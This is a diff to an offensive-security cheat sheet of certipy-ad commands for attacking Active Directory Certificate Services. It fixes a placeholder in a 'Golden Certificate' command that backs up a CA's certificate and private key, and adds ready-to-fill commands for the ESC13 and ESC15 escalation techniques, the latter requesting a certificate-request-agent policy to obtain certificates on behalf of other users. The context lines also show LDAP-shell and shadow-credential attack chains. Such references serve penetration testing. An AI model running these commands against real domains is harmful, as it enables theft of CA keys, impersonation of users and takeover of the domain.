@@ -29,7 +29,7 @@ certipy-ad auth -pfx <pfx-file> -dc-ip <dc-ip> -ldap-shell
 ## certipy-ad - Golden Certificate - steal CA certificate and private key
 #plateform/linux #target/remote #cat/ATTACK
 ```
-certipy-ad ca -u '<user>@<domain>' -p '<password>' -ns '<nameserver>' -target '<domain>' -config '<Hn-domain>\CORP-CA' -backup
+certipy-ad ca -u '<user>@<domain>' -p '<password>' -ns '<nameserver>' -target '<domain>' -config '<NetBIOS-domain-name>\CORP-CA' -backup
 ```
 
 ## certipy-ad - Golden Certificate - forge certificate
@@ -85,4 +85,21 @@ certipy-ad account update -u <user>@<domain> -p '<password>' -user <targeted-use
 Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential
 ```
 certipy-ad shadow auto -u <user>@<domain> -p '<password>' -account <targeted-user>
+```
+
+## certipy-ad - ESC13
+```
+certipy-ad req -u "<USER>@<DOMAIN>" -p "<PASSWORD>" -dc-ip "<DC_IP>" -target "<ADCS_HOST>" -ca '<ca_name>' -template '<template>'
+```
+
+## certipy-ad - ESC15 step 1
+Request a certificate with "Certificate Request Agent" application policy
+```
+certipy-ad req -u <USER>@<DOMAIN> --application-policies "1.3.6.1.4.1.311.20.2.1" -ca <ca_name> -template <template> -dc-ip <DC_IP>
+```
+
+## certipy-ad - ESC15 step 2
+Use the certificate in a ESC3 scenario to ask for a new certificate on behalf of another user
+```
+USE ESC3
 ```
